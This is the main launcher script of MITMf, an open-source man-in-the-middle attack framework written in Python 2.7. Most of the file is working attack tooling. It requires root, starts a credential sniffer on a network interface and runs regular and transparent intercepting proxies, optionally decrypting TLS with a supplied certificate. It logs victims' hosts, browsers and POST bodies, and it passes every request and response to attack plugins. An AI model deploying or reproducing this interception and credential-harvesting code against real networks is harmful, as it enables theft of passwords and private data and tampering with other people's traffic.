#! /usr/bin/env python2.7

# Copyright (c) 2014-2016 Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#
import os
import argparse
import threading
import sys
import logging

from functools import wraps
from user_agents import parse
from libmproxy import controller, proxy
from libmproxy.proxy.server import ProxyServer
from core.logger import *

if os.geteuid() != 0:
    sys.exit('I needz r00t!')

parser = argparse.ArgumentParser(description='MITMf', version='X', usage='mitmf.py -i INTERFACE [mitmf options] [plugin/module name] [plugin/module options]', epilog="Use wisely, young Padawan.")
group = parser.add_argument_group('MITMf', 'Options for MITMf')
group.add_argument('-i', dest='interface', required=True, help='Interface to bind to')
group.add_argument('--log-level', type=str, choices=['debug', 'info'], default='info', help='Specify a log level')
group.add_argument('--rproxy-port', metavar='PORT', type=int, default=10000, help='Regular proxy service port (default 10000)')
group.add_argument('--tproxy-port', metavar='PORT', type=int, default=10001, help='Transparent proxy service port (default 10001)')
group.add_argument('--ssl', type=str, metavar='PATH', dest='ssl', help='Enable SSL/TLS interception and use the certificate in PEM format at the specified path')

from plugins import *
#Get everything that inherits from the Plugin class
plugins = [plugin(parser) for plugin in plugin.Plugin.__subclasses__()]

if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)

options = parser.parse_args()
setup_logger(logging.__dict__[options.log_level.upper()])

from core.utils import get_ip, get_mac
ip = get_ip(options.interface)
mac = get_mac(options.interface)

from core.netcreds import NetCreds
NetCreds().start(options, ip)

called_plugins = []

#print "[-] Initializing modules, plugins and servers"
for plugin in plugins:
    if vars(options)[plugin.optname] is True:
        #print "|_ {} v{}".format(plugin.name, plugin.version)
        called_plugins.append(plugin)

def concurrent(func):
    '''This makes all events concurrent (emulates the decorator in inline scripts)'''

    @wraps(func)
    def concurrent_func(*args, **kwargs):
        t = threading.Thread(name=func.func_name, target = func, args = args, kwargs = kwargs)
        t.start()
        return t

    return concurrent_func

class StickyMaster(controller.Master):

    def __init__(self, server, logger):
        controller.Master.__init__(self, server)

        self.logger = logger
        self.handle_post_output = False
        self.ip = ip

        for key, value in vars(options).iteritems():
            setattr(self, key, value)

    def parse_user_agent(self, ua):
        user_agent = parse(ua)
        self.logger.extra['browser'] = user_agent.browser.family
        self.logger.extra['os'] = user_agent.os.family
        try:
            self.logger.extra['browser_v'] = user_agent.browser.version[0]
        except IndexError:
            self.logger.extra['browser_v'] = 'Other'

    def log(self, message):
        self.logger.info(message)

    def run(self):
        try:
            for plugin in called_plugins:
                plugin_hook = getattr(plugin, 'initialize')
                plugin_hook(self)

            return controller.Master.run(self)
        except KeyboardInterrupt:
            #self.handle_shutdown()
            self.shutdown()

    @concurrent
    def handle_request(self, flow):
        self.logger.extra['client'] = flow.client_conn.address.host
        self.parse_user_agent(flow.request.headers['User-Agent'][0])
        self.logger.info(flow.request.pretty_host)

        for plugin in called_plugins:
            plugin_hook = getattr(plugin, 'request')
            plugin_hook(self, flow)

        if flow.request.method == "POST" and flow.request.content and (self.handle_post_output is False):
            self.logger.info("POST Data ({}):\n{}".format(flow.request.host, flow.request.content))

        self.handle_post_output = False

        flow.reply()

    @concurrent
    def handle_responseheaders(self, flow):
        for plugin in called_plugins:
            plugin_hook = getattr(plugin, 'responseheaders')
            plugin_hook(self, flow)

        flow.reply()

    @concurrent
    def handle_response(self, flow):
        for plugin in called_plugins:
            plugin_hook = getattr(plugin, 'response')
            plugin_hook(self, flow)

        flow.reply()

    def handle_shutdown(self):
        for plugin in called_plugins:
            plugin_hook = getattr(plugin, 'shutdown')
            plugin_hook(self)

config = proxy.ProxyConfig(mode='regular', ignore_hosts=[r'.*:443'], port=options.rproxy_port)
if options.ssl:
    config = proxy.ProxyConfig(mode='regular', port=options.rproxy_port, certs=[('', options.ssl)])

server = ProxyServer(config)
rproxy_logger = ProxyLoggerAdapter(logging.getLogger('MITMf'), {'proxy': 'RProxy'})
m = StickyMaster(server, rproxy_logger)
t = threading.Thread(name='regular-proxy', target=m.run)
t.setDaemon(True)
t.start()

config = proxy.ProxyConfig(mode='transparent', ignore_hosts=[r'.*:443'], port=options.tproxy_port)
if options.ssl:
    config = proxy.ProxyConfig(mode='transparent', port=options.tproxy_port, certs=[('', options.ssl)])

server = ProxyServer(config)
tproxy_logger = ProxyLoggerAdapter(logging.getLogger('MITMf'), {'proxy': 'TProxy'})
m = StickyMaster(server, tproxy_logger)
m.run()